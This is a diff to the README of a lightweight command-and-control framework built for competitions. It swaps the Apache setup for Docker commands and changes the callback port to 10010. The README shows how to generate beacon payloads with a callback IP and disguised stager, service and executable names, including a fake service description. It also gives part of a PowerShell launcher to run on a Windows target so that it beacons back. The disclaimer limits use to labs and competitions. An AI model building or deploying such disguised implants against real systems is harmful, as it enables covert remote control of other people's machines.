@@ -28,16 +28,17 @@ An extremely light-weight command-and-control server and interface built for com
 
 ## Set up steps:
 
-### Set-up webserver
-First, run ``setup.sh``:
+### Set-up webserver Docker image:
+First build the docker image. **YOU ONLY NEED TO DO THIS ONCE**: 
 ```sh
-sudo chmod 755 setup.sh
-./setup.sh
+docker build -t server-backend-image .
 ```
-Then, turn on Apache2 with ``systemctl``:
+Second run the docker container with your chosen callback port. In this case, I'll choose port 10010. **RUN THIS WHENEVER YOU WANT TO HOST THE WEBSERVER**:
 ```sh
-sudo systemctl start apache2
+docker run -d --name server-backend -p 10010:80 server-backend-image
 ```
+The webserver backend will now be running and operational on port 10010 of your machine and port 80 of the container.
+
 ### Set-up interface
 Next, open the Java project and build it
 
@@ -47,7 +48,7 @@ Finally, generate a payload with ``python3 GenPayload.py``:
 # Example of a generated payload for:
 # Windows 64-bit architecture
 # Call-back ip: 10.10.50.173
-# Call-back port: 80
+# Call-back port: 10010 
 # File-transfer port: 9090
 # Interval: 5 seconds
 # Stager name: stdinit.ps1
@@ -55,7 +56,7 @@ Finally, generate a payload with ``python3 GenPayload.py``:
 # Beacon name: tsrfhelper.exe
 # Service description: Provodes the best media in the seven seas
 
-python3 GenPayload.py -os 1 -hh 10.10.50.173 -p 80 -bp 9090 -i 5 -a 64 -stn "stdinit" -sn "LinkControlFlow" -bn "tsrfhelper" -sd "Provides the best media in the seven seas"
+python3 GenPayload.py -os 1 -hh 10.10.50.173 -p 10010 -bp 9090 -i 5 -a 64 -stn "stdinit" -sn "LinkControlFlow" -bn "tsrfhelper" -sd "Provides the best media in the seven seas"
 ```
 The command will then output:
 ```sh
@@ -70,6 +71,14 @@ Start-Process "powershell.exe" -ArgumentList "-NoProfile", "-Command", ([System.
 Now all you have to do is run the top command on your machine and the bottom command on the Windows host. 
 
 It takes ~10 seconds for Linux hosts to begin beaconing after running the inital command and ~30 seconds for Windows.
+
+## Teardown:
+
+### Turn off Docker image:
+Run:
+```sh
+docker stop server-backend
+```
 
 ## Disclaimer
 THIS PROJECT IS MADE **ONLY** FOR WORKSHOP, LAB, AND COMPETITION PURPOSES. I AM NOT RESPONSIBLE FOR ANY ILLICIT ACTIVITY DONE WITH THIS TOOLING.
